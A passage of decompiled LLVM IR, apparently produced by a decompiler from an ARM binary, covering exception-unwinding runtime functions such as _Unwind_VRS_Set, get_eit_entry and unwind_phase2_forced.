  %v2_21d38 = inttoptr i32 %v1_21d38 to i32*
  %v3_21d38 = load i32, i32* %v2_21d38, align 4
  %v2_21d44 = bitcast i8* %valuep to i32*
  store i32 %v3_21d38, i32* %v2_21d44, align 4
  ret i32 0

dec_label_pc_21d4c:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_21d4c
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_21d4c, %bb9
  %v0_21d54 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_21d54)
  br label %dec_label_pc_21d58

dec_label_pc_21d58:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_21d58, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_21d60 = icmp eq i32 %regclass, 0
  br i1 %v2_21d60, label %dec_label_pc_21d68, label %dec_label_pc_21d98

dec_label_pc_21d68:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_21d68
  %v6_21d6c = icmp eq i32 %representation, 0
  br i1 %v6_21d6c, label %dec_label_pc_21d7c, label %bb8

.thread3:                                         ; preds = %dec_label_pc_21d68
  br label %dec_label_pc_21da4

bb8:                                              ; preds = %bb
  br label %dec_label_pc_21da4

dec_label_pc_21d7c:                               ; preds = %bb
  %v3_21d80 = mul i32 %regno, 4
  %v1_21d84 = bitcast i8* %valuep to i32*
  %v2_21d84 = load i32, i32* %v1_21d84, align 4
  %v2_21d88 = add i32 %v3_21d80, %context
  %v2_21d90 = add i32 %v2_21d88, 4
  %v3_21d90 = inttoptr i32 %v2_21d90 to i32*
  store i32 %v2_21d84, i32* %v3_21d90, align 4
  ret i32 0

dec_label_pc_21d98:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_21d98
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_21d98, %bb9
  %v0_21da0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_21da0)
  br label %dec_label_pc_21da4

dec_label_pc_21da4:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_21da4, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_21dac = add i32 %context, 68
  %v2_21dac = inttoptr i32 %v1_21dac to i32*
  %v3_21dac = load i32, i32* %v2_21dac, align 4
  ret i32 %v3_21dac

; uselistorder directives
  uselistorder i32 68, { 10, 1, 7, 2, 3, 4, 0, 5, 6, 9, 8 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_21dbc = add i32 %exc, 8
  %v2_21dbc = inttoptr i32 %v1_21dbc to i32*
  %v3_21dbc = load i32, i32* %v2_21dbc, align 4
  %v2_21dc0 = icmp eq i32 %v3_21dbc, 0
  br i1 %v2_21dc0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_21dd4 = xor i1 %v2_21dc0, true
  call void @__pseudo_cond_branch(i1 %v2_21dd4, i32 %v3_21dbc)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_21dec = call i32 @abort()
  ret i32 %v0_21dec
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_21df8 = call i32 @abort()
  ret i32 %v0_21df8
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_21dfc = load i32, i32* @r4, align 4
  store i32 %v3_21dfc, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r5.global-to-local, align 4
  %v4_21e0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 144) to i32*), align 4
  %v2_21e10 = icmp eq i32 %v4_21e0c, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_21e1c = add i32 %return_address, -2
  store i32 %v1_21e1c, i32* %r4.global-to-local, align 4
  br i1 %v2_21e10, label %dec_label_pc_21e54, label %dec_label_pc_21e24

dec_label_pc_21e24:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_21e0c)
  %v2_21e34 = icmp eq i32 %v1_21e1c, 0
  br i1 %v2_21e34, label %.thread, label %dec_label_pc_21e74thread-pre-split

.thread:                                          ; preds = %dec_label_pc_21e24
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_21e3c = load i32, i32* %r6.global-to-local, align 4
  %v3_21e3c = add i32 %v2_21e3c, 16
  %v4_21e3c = inttoptr i32 %v3_21e3c to i32*
  store i32 0, i32* %v4_21e3c, align 4
  br label %dec_label_pc_21e44

dec_label_pc_21e44:                               ; preds = %.thread, %.thread10, %dec_label_pc_21fec, %dec_label_pc_21fd8, %dec_label_pc_21fb4, %dec_label_pc_21f8c, %dec_label_pc_21e8c
  %v0_21e44 = load i32, i32* %r2.global-to-local, align 4
  %v2_21e4c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_21e4c, i32* @r4, align 4
  ret i32 %v0_21e44

dec_label_pc_21e54:                               ; preds = %entry
  store i32 24, i32* %r2.global-to-local, align 4
  %v4_21e5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 24) to i32*), align 4
  %v4_21e60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 56) to i32*), align 4
  store i32 %v4_21e60, i32* %r2.global-to-local, align 4
  %v2_21e64 = sub i32 %v4_21e5c, %v4_21e60
  %v3_21e68 = sdiv i32 %v2_21e64, 8
  store i32 %v3_21e68, i32* %stack_var_-36, align 4
  br label %dec_label_pc_21e74

dec_label_pc_21e74thread-pre-split:               ; preds = %dec_label_pc_21e24
  %v3_21e74.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_21e74

dec_label_pc_21e74:                               ; preds = %dec_label_pc_21e74thread-pre-split, %dec_label_pc_21e54
  %v0_21eb8.pre = phi i32 [ %v1_21e1c, %dec_label_pc_21e74thread-pre-split ], [ %v4_21e60, %dec_label_pc_21e54 ]
  %v1_21e7c = phi i32 [ %v3_21e74.pr, %dec_label_pc_21e74thread-pre-split ], [ %v3_21e68, %dec_label_pc_21e54 ]
  %v2_21e78 = icmp eq i32 %v1_21e7c, 0
  br i1 %v2_21e78, label %dec_label_pc_21e8c, label %dec_label_pc_21ea8.preheader

dec_label_pc_21ea8.preheader:                     ; preds = %dec_label_pc_21e74
  %v2_21e7c = add i32 %v1_21e7c, -1
  %v1_21ed8 = add i32 %v0_21eb8.pre, 8
  br label %dec_label_pc_21ea8.outer

dec_label_pc_21e8c.loopexit:                      ; preds = %dec_label_pc_21f04
  br label %dec_label_pc_21e8c

dec_label_pc_21e8c:                               ; preds = %dec_label_pc_21e8c.loopexit, %dec_label_pc_21e74, %dec_label_pc_21fd0
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_21e94 = load i32, i32* %r6.global-to-local, align 4
  %v2_21e94 = add i32 %v1_21e94, 16
  %v3_21e94 = inttoptr i32 %v2_21e94 to i32*
  store i32 0, i32* %v3_21e94, align 4
  br label %dec_label_pc_21e44

dec_label_pc_21e9c:                               ; preds = %dec_label_pc_21ef8
  %v3_21e9c = icmp ult i32 %storemerge40, %v0_21efc
  br i1 %v3_21e9c, label %dec_label_pc_21ea4, label %dec_label_pc_21f14

dec_label_pc_21ea4:                               ; preds = %dec_label_pc_21e9c
  %v1_21ea4 = add nsw i32 %v3_21eb0, 1
  br label %dec_label_pc_21ea8.outer

dec_label_pc_21ea8.outer:                         ; preds = %dec_label_pc_21ea4, %dec_label_pc_21ea8.preheader
  %v1_21f04.ph = phi i32 [ %v1_21ea4, %dec_label_pc_21ea4 ], [ 0, %dec_label_pc_21ea8.preheader ]
  %v0_21ea8.ph = phi i32 [ %v0_21ea8, %dec_label_pc_21ea4 ], [ %v2_21e7c, %dec_label_pc_21ea8.preheader ]
  br label %dec_label_pc_21ea8

dec_label_pc_21ea8:                               ; preds = %dec_label_pc_21ea8.outer, %dec_label_pc_21f0c
  %v0_21ea8 = phi i32 [ %v1_21f0c, %dec_label_pc_21f0c ], [ %v0_21ea8.ph, %dec_label_pc_21ea8.outer ]
  %v2_21ea8 = add i32 %v0_21ea8, %v1_21f04.ph
  %tmp = icmp slt i32 %v2_21ea8, 0
  %v4_21eac = zext i1 %tmp to i32
  %v5_21eac = add i32 %v4_21eac, %v2_21ea8
  %v3_21eb0 = sdiv i32 %v5_21eac, 2
  %v3_21eb4 = mul i32 %v3_21eb0, 8
  store i32 %v3_21eb4, i32* @ip, align 4
  %v2_21eb8 = add i32 %v3_21eb4, %v0_21eb8.pre
  %v3_21eb8 = inttoptr i32 %v2_21eb8 to i32*
  %v4_21eb8 = load i32, i32* %v3_21eb8, align 4
  %v1_21ebc = and i32 %v4_21eb8, 1073741824
  %v2_21ebc = icmp eq i32 %v1_21ebc, 0
  %v2_21ec0 = or i32 %v4_21eb8, -2147483648
  %tmp79 = bitcast i32 %v4_21eb8 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_21ec4 = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_21ebc, i32 %v2_21ec4, i32 %v2_21ec0
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_21ec8 = icmp eq i32 %v2_21e7c, %v3_21eb0
  store i32 %v2_21eb8, i32* %r7.global-to-local, align 4
  br i1 %v9_21ec8, label %dec_label_pc_21ef8, label %dec_label_pc_21ed8

dec_label_pc_21ed8:                               ; preds = %dec_label_pc_21ea8
  %v2_21edc = add i32 %v3_21eb4, %v1_21ed8
  %v3_21edc = inttoptr i32 %v2_21edc to i32*
  %v4_21edc = load i32, i32* %v3_21edc, align 4
  %v1_21ee4 = and i32 %v4_21edc, 1073741824
  %v2_21ee4 = icmp eq i32 %v1_21ee4, 0
  %v2_21ee8 = or i32 %v4_21edc, -2147483648
  %tmp81 = bitcast i32 %v4_21edc to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_21eec = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_21ee4, i32 %v2_21eec, i32 %v2_21ee8
  %v1_21ef0 = add i32 %v2_21edc, -1
  %v2_21ef4 = add i32 %storemerge39, %v1_21ef0
  br label %dec_label_pc_21ef8

dec_label_pc_21ef8:                               ; preds = %dec_label_pc_21ea8, %dec_label_pc_21ed8
  %storemerge40 = phi i32 [ %v2_21ef4, %dec_label_pc_21ed8 ], [ -1, %dec_label_pc_21ea8 ]
  %v2_21ef8 = add i32 %storemerge, %v2_21eb8
  %v0_21efc = load i32, i32* %r4.global-to-local, align 4
  %v3_21efc = icmp ult i32 %v0_21efc, %v2_21ef8
  br i1 %v3_21efc, label %dec_label_pc_21f04, label %dec_label_pc_21e9c

dec_label_pc_21f04:                               ; preds = %dec_label_pc_21ef8
  %v9_21f04 = icmp eq i32 %v3_21eb0, %v1_21f04.ph
  br i1 %v9_21f04, label %dec_label_pc_21e8c.loopexit, label %dec_label_pc_21f0c

dec_label_pc_21f0c:                               ; preds = %dec_label_pc_21f04
  %v1_21f0c = add nsw i32 %v3_21eb0, -1
  br label %dec_label_pc_21ea8

dec_label_pc_21f14:                               ; preds = %dec_label_pc_21e9c
  %v2_21f14 = load i32, i32* %v3_21eb8, align 4
  %v1_21f18 = and i32 %v2_21f14, 1073741824
  %v2_21f18 = icmp eq i32 %v1_21f18, 0
  %v2_21f1c = or i32 %v2_21f14, -2147483648
  %tmp83 = bitcast i32 %v2_21f14 to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_21f20 = bitcast float %tmp84 to i32
  %v0_21f24 = select i1 %v2_21f18, i32 %v2_21f20, i32 %v2_21f1c
  %v2_21f24 = add i32 %v0_21f24, %v2_21eb8
  %v1_21f28 = load i32, i32* %r6.global-to-local, align 4
  %v2_21f28 = add i32 %v1_21f28, 72
  %v3_21f28 = inttoptr i32 %v2_21f28 to i32*
  store i32 %v2_21f24, i32* %v3_21f28, align 4
  %v0_21f2c = load i32, i32* %r7.global-to-local, align 4
  %v1_21f2c = add i32 %v0_21f2c, 4
  %v2_21f2c = inttoptr i32 %v1_21f2c to i32*
  %v3_21f2c = load i32, i32* %v2_21f2c, align 4
  %v7_21f30 = icmp eq i32 %v3_21f2c, 1
  br i1 %v7_21f30, label %.thread10, label %dec_label_pc_21f44

.thread10:                                        ; preds = %dec_label_pc_21f14
  %v1_21f30 = add i32 %v3_21f2c, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_21f3c = load i32, i32* %r6.global-to-local, align 4
  %v3_21f3c = add i32 %v2_21f3c, 16
  %v4_21f3c = inttoptr i32 %v3_21f3c to i32*
  store i32 %v1_21f30, i32* %v4_21f3c, align 4
  br label %dec_label_pc_21e44

dec_label_pc_21f44:                               ; preds = %dec_label_pc_21f14
  %v1_21f44 = icmp slt i32 %v3_21f2c, 0
  br i1 %v1_21f44, label %.thread38, label %dec_label_pc_21f5c

.thread38:                                        ; preds = %dec_label_pc_21f44
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_21f50 = load i32, i32* %r6.global-to-local, align 4
  %v5_21f50 = add i32 %v4_21f50, 76
  %v6_21f50 = inttoptr i32 %v5_21f50 to i32*
  store i32 %v1_21f2c, i32* %v6_21f50, align 4
  %v3_21f54 = load i32, i32* %r2.global-to-local, align 4
  %v4_21f54 = load i32, i32* %r6.global-to-local, align 4
  %v5_21f54 = add i32 %v4_21f54, 80
  %v6_21f54 = inttoptr i32 %v5_21f54 to i32*
  store i32 %v3_21f54, i32* %v6_21f54, align 4
  br label %dec_label_pc_21f7c

dec_label_pc_21f5c:                               ; preds = %dec_label_pc_21f44
  %v1_21f5c = and i32 %v3_21f2c, 1073741824
  %v2_21f5c = icmp eq i32 %v1_21f5c, 0
  %v2_21f60 = or i32 %v3_21f2c, -2147483648
  %tmp85 = bitcast i32 %v3_21f2c to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_21f64 = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_21f5c, i32 %v2_21f64, i32 %v2_21f60
  %v1_21f68 = add i32 %storemerge42, 4
  %v2_21f6c = add i32 %v1_21f68, %v0_21f2c
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_21f74 = load i32, i32* %r6.global-to-local, align 4
  %v2_21f74 = add i32 %v1_21f74, 76
  %v3_21f74 = inttoptr i32 %v2_21f74 to i32*
  store i32 %v2_21f6c, i32* %v3_21f74, align 4
  %v0_21f78 = load i32, i32* %r2.global-to-local, align 4
  %v1_21f78 = load i32, i32* %r6.global-to-local, align 4
  %v2_21f78 = add i32 %v1_21f78, 80
  %v3_21f78 = inttoptr i32 %v2_21f78 to i32*
  store i32 %v0_21f78, i32* %v3_21f78, align 4
  br label %dec_label_pc_21f7c

dec_label_pc_21f7c:                               ; preds = %.thread38, %dec_label_pc_21f5c
  %v0_21f7c = load i32, i32* %r6.global-to-local, align 4
  %v1_21f7c = add i32 %v0_21f7c, 76
  %v2_21f7c = inttoptr i32 %v1_21f7c to i32*
  %v3_21f7c = load i32, i32* %v2_21f7c, align 4
  store i32 %v3_21f7c, i32* %r2.global-to-local, align 4
  %v1_21f80 = inttoptr i32 %v3_21f7c to i32*
  %v2_21f80 = load i32, i32* %v1_21f80, align 4
  %v1_21f84 = icmp slt i32 %v2_21f80, 0
  br i1 %v1_21f84, label %dec_label_pc_21fa8, label %dec_label_pc_21f8c

dec_label_pc_21f8c:                               ; preds = %dec_label_pc_21f7c
  %v1_21f8c = and i32 %v2_21f80, 1073741824
  %v2_21f8c = icmp eq i32 %v1_21f8c, 0
  %v2_21f90 = or i32 %v2_21f80, -2147483648
  %tmp87 = bitcast i32 %v2_21f80 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_21f94 = bitcast float %tmp88 to i32
  %v0_21f98 = select i1 %v2_21f8c, i32 %v2_21f94, i32 %v2_21f90
  %v2_21f98 = add i32 %v0_21f98, %v3_21f7c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_21fa0 = add i32 %v0_21f7c, 16
  %v3_21fa0 = inttoptr i32 %v2_21fa0 to i32*
  store i32 %v2_21f98, i32* %v3_21fa0, align 4
  br label %dec_label_pc_21e44

dec_label_pc_21fa8:                               ; preds = %dec_label_pc_21f7c
  %v3_21fa8 = udiv i32 %v2_21f80, 16777216
  %v1_21fac = urem i32 %v3_21fa8, 16
  %v2_21fac = icmp eq i32 %v1_21fac, 0
  br i1 %v2_21fac, label %dec_label_pc_21fb4, label %dec_label_pc_21fc8

dec_label_pc_21fb4:                               ; preds = %dec_label_pc_21fa8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_21fbc = load i32, i32* %r5.global-to-local, align 4
  %v2_21fbc = add i32 %v0_21fbc, -63068
  %v2_21fc0 = add i32 %v0_21f7c, 16
  %v3_21fc0 = inttoptr i32 %v2_21fc0 to i32*
  store i32 %v2_21fbc, i32* %v3_21fc0, align 4
  br label %dec_label_pc_21e44

dec_label_pc_21fc8:                               ; preds = %dec_label_pc_21fa8
  %v7_21fc8 = icmp eq i32 %v1_21fac, 1
  br i1 %v7_21fc8, label %dec_label_pc_21fec, label %dec_label_pc_21fd0

dec_label_pc_21fd0:                               ; preds = %dec_label_pc_21fc8
  %v7_21fd0 = icmp eq i32 %v1_21fac, 2
  br i1 %v7_21fd0, label %dec_label_pc_21fd8, label %dec_label_pc_21e8c

dec_label_pc_21fd8:                               ; preds = %dec_label_pc_21fd0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_21fe0 = load i32, i32* %r5.global-to-local, align 4
  %v2_21fe0 = add i32 %v0_21fe0, -63084
  %v2_21fe4 = add i32 %v0_21f7c, 16
  %v3_21fe4 = inttoptr i32 %v2_21fe4 to i32*
  store i32 %v2_21fe0, i32* %v3_21fe4, align 4
  br label %dec_label_pc_21e44

dec_label_pc_21fec:                               ; preds = %dec_label_pc_21fc8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_21ff4 = load i32, i32* %r5.global-to-local, align 4
  %v2_21ff4 = add i32 %v0_21ff4, -63076
  %v2_21ff8 = add i32 %v0_21f7c, 16
  %v3_21ff8 = inttoptr i32 %v2_21ff8 to i32*
  store i32 %v2_21ff4, i32* %v3_21ff8, align 4
  br label %dec_label_pc_21e44

; uselistorder directives
  uselistorder i32 %v1_21fac, { 2, 1, 0 }
  uselistorder i32 %v0_21f7c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_21f2c, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_21efc, { 1, 0 }
  uselistorder i32 %v3_21eb4, { 2, 1, 0 }
  uselistorder i32 %v3_21eb0, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_21ea8, { 1, 0 }
  uselistorder i32 %v0_21ea8, { 1, 0 }
  uselistorder i32 %v2_21e7c, { 1, 0 }
  uselistorder i32 %v0_21eb8.pre, { 1, 0 }
  uselistorder i32 %v3_21e68, { 1, 0 }
  uselistorder i32 %v1_21e1c, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder label %dec_label_pc_21f7c, { 1, 0 }
  uselistorder label %dec_label_pc_21ef8, { 1, 0 }
  uselistorder label %dec_label_pc_21ea8, { 1, 0 }
  uselistorder label %dec_label_pc_21e8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_21e44, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_22004(i32 %arg1) local_unnamed_addr {
dec_label_pc_22004:
  %v0_22004 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_22004, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_22004
  %v3_22004 = mul i32 %arg1, %arg1
  %v2_22008 = load i32, i32* @r8, align 4
  %v8_22008 = shl i32 %v2_22008, %v3_22004
  %v9_22008 = and i32 %v8_22008, %v3_22004
  %v8_2200c = lshr i32 %v2_22008, %v9_22008
  %v9_2200c = and i32 %v8_2200c, %v9_22008
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_22004, %bb
  %v10_2200c = phi i32 [ %arg1, %dec_label_pc_22004 ], [ %v9_2200c, %bb ]
  ret i32 %v10_2200c

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_22020 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_22034 = inttoptr i32 %v1_22020 to i32*
  %v2_22034 = load i32, i32* %v1_22034, align 4
  store i32 %v2_22034, i32* %r0.global-to-local, align 4
  %v12_22034 = add i32 %entry_vrs, 20
  %v1_22040 = inttoptr i32 %v12_22034 to i32*
  %v2_22040 = load i32, i32* %v1_22040, align 4
  store i32 %v2_22040, i32* %r0.global-to-local, align 4
  %v12_22040 = add i32 %entry_vrs, 36
  %v1_22048 = inttoptr i32 %v12_22040 to i32*
  %v2_22048 = load i32, i32* %v1_22048, align 4
  store i32 %v2_22048, i32* %r0.global-to-local, align 4
  %v12_22048 = add i32 %entry_vrs, 52
  store i32 %v12_22048, i32* @ip, align 4
  %v13_2204c = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_2204c, i32* @lr, align 4
  %v1_22050 = inttoptr i32 %v12_22048 to i32*
  %v2_22050 = load i32, i32* %v1_22050, align 4
  store i32 %v2_22050, i32* %r0.global-to-local, align 4
  %v9_22050 = add i32 %entry_vrs, 64
  %v10_22050 = inttoptr i32 %v9_22050 to i32*
  %v11_22050 = load i32, i32* %v10_22050, align 4
  store i32 0, i32* @r4, align 4
  %v1_22058 = add i32 %ucbp, 12
  %v2_22058 = inttoptr i32 %v1_22058 to i32*
  %v3_22058 = load i32, i32* %v2_22058, align 4
  store i32 %v2_22050, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_22070 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_22050)
  store i32 %v2_22070, i32* %r0.global-to-local, align 4
  %v0_22074 = load i32, i32* @r6, align 4
  %v1_22074 = load i32, i32* @r4, align 4
  %v9_22074 = icmp eq i32 %v0_22074, %v1_22074
  store i32 %v2_22070, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_22074, label %dec_label_pc_22088, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_22094

dec_label_pc_22088:                               ; preds = %entry
  store i32 %v0_22074, i32* @r4, align 4
  br label %dec_label_pc_22090

dec_label_pc_22090:                               ; preds = %dec_label_pc_22158, %dec_label_pc_22088
  br label %dec_label_pc_22094

dec_label_pc_22094:                               ; preds = %.thread, %dec_label_pc_22090
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_22090 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_22094 = icmp eq i32 %v2_22070, 0
  br i1 %v2_22094, label %dec_label_pc_2210c, label %.thread2.dec_label_pc_220a8_crit_edge

.thread2.dec_label_pc_220a8_crit_edge:            ; preds = %dec_label_pc_22094
  br label %dec_label_pc_220a8

dec_label_pc_220a8:                               ; preds = %.thread2.dec_label_pc_220a8_crit_edge, %dec_label_pc_2210c
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_220b8 = load i32, i32* @r5, align 4
  store i32 %v0_220b8, i32* @r3, align 4
  store i32 139464, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_22058)
  br i1 false, label %dec_label_pc_220d0, label %dec_label_pc_220f8

dec_label_pc_220d0:                               ; preds = %dec_label_pc_220a8
  br i1 undef, label %dec_label_pc_220d8, label %dec_label_pc_220fc

dec_label_pc_220d8:                               ; preds = %dec_label_pc_220d0
  br i1 undef, label %dec_label_pc_22158, label %dec_label_pc_220f0

dec_label_pc_220f0:                               ; preds = %dec_label_pc_220d8
  br i1 undef, label %dec_label_pc_22150, label %dec_label_pc_220f8

dec_label_pc_220f8:                               ; preds = %dec_label_pc_220a8, %dec_label_pc_220f0
  br label %dec_label_pc_220fc

dec_label_pc_220fc:                               ; preds = %dec_label_pc_220d0, %dec_label_pc_220f8
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_2210c:                               ; preds = %dec_label_pc_22094
  store i32 %v11_22050, i32* @r3, align 4
  %v2_22110 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_22110, i32* @r4, align 4
  %v1_22114 = load i32, i32* @r5, align 4
  %v2_22114 = add i32 %v1_22114, 20
  %v3_22114 = inttoptr i32 %v2_22114 to i32*
  store i32 %v11_22050, i32* %v3_22114, align 4
  store i32 %v2_22110, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_22124 = call i32 @memcpy()
  %v0_2212c = load i32, i32* @r6, align 4
  store i32 %v0_2212c, i32* %r0.global-to-local, align 4
  %v0_22130 = load i32, i32* @r5, align 4
  %v1_22134 = add i32 %v0_22130, 16
  %v2_22134 = inttoptr i32 %v1_22134 to i32*
  %v3_22134 = load i32, i32* %v2_22134, align 4
  store i32 %v3_22134, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_22134)
  %v0_22144 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22144, i32* @r4, align 4
  br label %dec_label_pc_220a8

dec_label_pc_22150:                               ; preds = %dec_label_pc_220f0
  br label %dec_label_pc_22158

dec_label_pc_22158:                               ; preds = %dec_label_pc_220d8, %dec_label_pc_22150
  br label %dec_label_pc_22090

; uselistorder directives
  uselistorder i32 %v11_22050, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 20, 19, 18, 14, 13, 12, 11, 10, 9, 27, 1, 17, 16, 8, 15, 7, 6, 0, 5, 4, 3, 26, 25, 24, 23, 22, 21 }
  uselistorder i32* @r3, { 124, 125, 46, 47, 15, 16, 48, 49, 6, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 91, 3, 90, 4, 64, 18, 20, 21, 17, 126, 127, 63, 92, 93, 94, 133, 134, 135, 136, 137, 138, 0, 139, 140, 141, 142, 95, 96, 97, 98, 99, 100, 102, 103, 104, 72, 73, 74, 75, 76, 77, 78, 105, 106, 107, 108, 19, 143, 144, 153, 154, 155, 147, 148, 149, 150, 151, 1, 152, 5, 121, 122, 145, 146, 61, 62, 118, 119, 120, 113, 114, 65, 109, 110, 128, 129, 130, 131, 132, 8, 9, 10, 159, 156, 157, 158, 2, 160, 161, 162, 111, 112, 101, 22, 23, 38, 39, 35, 66, 67, 68, 69, 70, 71, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 11, 12, 13, 14, 40, 41, 42, 43, 44, 45, 7, 115, 116, 117, 123 }
  uselistorder i32 10, { 1, 4, 39, 41, 42, 13, 45, 48, 49, 50, 32, 33, 15, 14, 5, 52, 51, 16, 53, 17, 54, 18, 55, 56, 2, 46, 47, 57, 19, 58, 20, 21, 22, 40, 9, 34, 64, 0, 43, 44, 23, 62, 59, 60, 24, 61, 26, 25, 35, 36, 8, 12, 11, 7, 10, 3, 37, 38, 27, 6, 29, 30, 28, 31, 63 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_22158, { 1, 0 }
  uselistorder label %dec_label_pc_220fc, { 1, 0 }
  uselistorder label %dec_label_pc_220f8, { 1, 0 }
  uselistorder label %dec_label_pc_220a8, { 1, 0 }
  uselistorder label %dec_label_pc_22094, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_2216c = add i32 %ucbp, 12
  %v3_2216c = inttoptr i32 %v2_2216c to i32*
  store i32 %stop_fn, i32* %v3_2216c, align 4
  %v3_22170 = add i32 %ucbp, 24
  %v4_22170 = inttoptr i32 %v3_22170 to i32*
